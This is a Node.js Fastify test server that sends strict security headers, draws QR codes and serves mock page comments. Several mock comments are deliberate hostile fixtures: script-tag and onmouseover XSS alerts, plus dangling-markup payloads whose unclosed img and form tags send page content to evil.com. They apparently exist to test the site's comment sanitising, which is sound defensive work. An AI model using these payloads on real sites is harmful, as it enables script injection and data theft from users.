"use strict";
const fs = require('fs');
const path = require('path');
const fastify = require('fastify');
const compression = require('fastify-compress');
const serveStatic = require('fastify-static');
const PImage = require('pureimage');
const qrCode = require("./build/noModules/modules/QRCodeRenderer");

let ieVersion = "edge";

const server = fastify({
    http2: true,
    https: {
        allowHTTP1: true, // fallback support for HTTP1
        pfx: fs.readFileSync(path.join(__dirname, 'https', 'testingCert.pfx')),
        passphrase: "testingCert"
    }
});
// gzip/deflate outgoing responses
server.register(compression);
// serve dynamic images
server.get("/qrCode.png", handleDynamicImages);
// serve comment JSON
server.get("/comments.json", getCommentData);
// test reflection endpoint
server.post("/reflect.json", reflectJson);
// serve static files
server.register(serveStatic,
{
    root: __dirname + "/build",
    maxAge: 1000 * 60 * 60 * 24,//Cache for a day at least
    setHeaders: setHeaders,
    lastModified: true,
    etag: true
});
server.listen(8080, function (err, address) {
    if (err) {
        console.error(err);
        process.exit(1);
    }
    console.log(`Server running on ${address}...`);
});

function setHeaders(res, path, stat){
    if (path.endsWith(".html")) {
        res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data: https://img.youtube.com; " +
            "object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'; " +
            "frame-src 'self' https://www.youtube.com;");
        res.setHeader("Referrer-Policy", "same-origin");
        res.setHeader("Feature-Policy", "sync-xhr 'none'; sync-script 'none'; legacy-image-formats 'none'; " +
            "accelerometer 'none'; ambient-light-sensor 'none'; camera 'none'; gyroscope 'none'; " +
            "magnetometer 'none'; microphone 'none'; fullscreen 'none'; encrypted-media 'none'; " +
            "document-domain 'none'; autoplay 'self'; geolocation 'none'; payment 'self'; " +
            "xr-spatial-tracking 'none'; usb 'none'; midi 'none';");
        res.setHeader("Document-Policy", "no-unsized-media, no-document-write, no-vertical-scroll, " +
            "image-compression;bpp=2");
        res.setHeader("X-Frame-Options", "sameorigin");
        res.setHeader("Cross-Origin-Window-Policy", "Allow-PostMessage");
        res.setHeader("X-UA-Compatible", `IE=${ieVersion}`);
    }
    res.setHeader("Cross-Origin-Resource-Policy", "same-site");
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("TK", "N");
    addMimeTypes(res, path);
}

function addMimeTypes(res, path){
    if (path.endsWith(".wasm")) {
        res.setHeader('content-type', 'application/wasm');
    }
}

function handleDynamicImages (req, reply) {
    reply.header('Vary', 'referer');
    reply.header("Cross-Origin-Resource-Policy", "same-site");
    reply.type('image/png');

    const referrerGetParamaters = readGetParamaters(req.headers["referer"]);
    const qrCode = referrerGetParamaters["QRCode"];
    if (!qrCode) {
        return1x1pxPng(reply);
    } else {
        drawQrCode(reply, qrCode);
    }
}

function return1x1pxPng(reply) {
    const image = PImage.make(1, 1);
    PImage.encodePNGToStream(image, reply.res);
}

function setNoCache(res) {
    res.setHeader('Cache-Control', 'no-store, private, must-revalidate');
}

function drawQrCode(reply, codeString) {
    const model = new qrCode.QRCodeModel(qrCode._getTypeNumber(codeString, 2), 2);
    model.addData(codeString);
    model.make();

    const nCount = model.moduleCount;

    const imageSize = 360;
    const cellSize = imageSize / nCount;

    const image = PImage.make(imageSize, imageSize);
    const ctx = image.getContext("2d");

    for (let row = 0; row < nCount; row++) {
        for (let col = 0; col < nCount; col++) {
            ctx.strokeStyle = ctx.fillStyle = model.isDark(row, col) ? "black" : "white";
            const y = row * cellSize;
            const x = col * cellSize;
            ctx.fillRect(y, x, cellSize, cellSize);
        }
    }

    PImage.encodePNGToStream(image, reply.res);
}

function reflectJson(req, reply) {
    reply.header("Cross-Origin-Resource-Policy", "same-site");
    reply.type('application/json');
    reply.send(req.body);
}

function getCommentData(req, reply){
    reply.header("Cross-Origin-Resource-Policy", "same-site");
    reply.type('application/json');

    const pageId = req.query["id"];

    // TODO in an actual implemention, fetch this from a database
    switch (pageId) {
        case "1":
            reply.send([//TODO load from external source
{
    author: "Some guy",
    date: (new Date(2019, 7, 10, 9, 35)).getTime(),
    text: "<p style='font-size:72px'>Wow, I'm a normal comment!</p>"
},
{
    author: "Guy 2",
    text: "<a href=\"https://google.com\">I have a link</a>" +
            "<img src=\"https://www.google.com//images/branding/googlelogo/2x/googlelogo_color_272x92dp.png\" alt=\"And an image\">" +
            "<svg height=\"210\" width=\"500\">" +
                "<polygon points=\"100,10 40,198 190,78 10,78 160,198\" style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:nonzero;\"/>" +
                "Sorry, your browser does not support inline SVG." +
            "</svg>" +
            "<math display=\"block\"><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><mfrac><mn>1</mn>" +
            "<mstyle displaystyle=\"true\" scriptlevel=\"0\"><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo>" +
            "<mfrac><mn>1</mn><mstyle displaystyle=\"true\" scriptlevel=\"0\"><msub><mi>a</mi><mn>2</mn>" +
            "</msub><mo>+</mo><mfrac><mn>1</mn><mstyle displaystyle=\"true\" scriptlevel=\"0\"><msub>" +
            "<mi>a</mi><mn>3</mn></msub><mo>+</mo><mfrac><mn>1</mn><mstyle displaystyle=\"true\" scriptlevel=\"0\">" +
            "<msub><mi>a</mi><mn>4</mn></msub></mstyle></mfrac></mstyle></mfrac></mstyle></mfrac></mstyle></mfrac></mrow></math>"
},
{
    author: "Dead guy",
    text: "<script>alert(1);<\/script>" +
            "<p>I am l337 h4cker.</p>" +
            "<p onmouseover=\"alert(1)\">See?</p>"
},
{
    author: "Annoying person 34",
    date: (new Date(2019, 7, 10, 10, 6)).getTime(),
    text: "<p>I</p>" +
            "<p>have</p>" +
            "<p>a</p>" +
            "<p>lot</p>" +
            "<p>of</p>" +
            "<p>things</p>" +
            "<p>to</p>" +
            "<p>say</p>" +
            "<p>!</p>"
},
{
    author: "Annoying person 35",
    date: (new Date(2019, 7, 16, 9, 30)).getTime(),
    text: "<p>Dangeling markup attack!</p>" +
            "<base href='http://evil.com/'>" +
            "<a href='/rel'>Relative link</a>" +
            "<meta http-equiv='Refresh' content='0; url=http://example.com/'>" +
            "<img src='http://evil.com/log.cgi?"
},
{
    author: "Annoying person 36",
    date: (new Date(2019, 7, 16, 9, 33)).getTime(),
    text: "<p>Dangeling markup attack 2!</p>" +
            "<form action='http://evil.com/log.cgi'><textarea>"
}
            ]);
            break;
        default:
            reply.send([]);
    }
}

function readGetParamaters(url) {
    const result = {};
    if (!url) return result;
    const refererUrlQuery = url.split("?")[1];
    if (refererUrlQuery) {
        const queryStringParts = refererUrlQuery.split("&");
        queryStringParts.forEach(part => {
            let parts = part.split('=');
            result[parts[0]] = decodeURIComponent(parts[1].replace(/\+/g, ' '));
        });
    }
    return result;
}

process.on("message", (m) => {
    if (m === "shutdown") {
        //A parent process has asked us to stop
        server.close();
    } else if (typeof m === "object") {
        if (m.set === "ieVersion" && typeof m.value === "string") {
            ieVersion = m.value;
        }
    }
});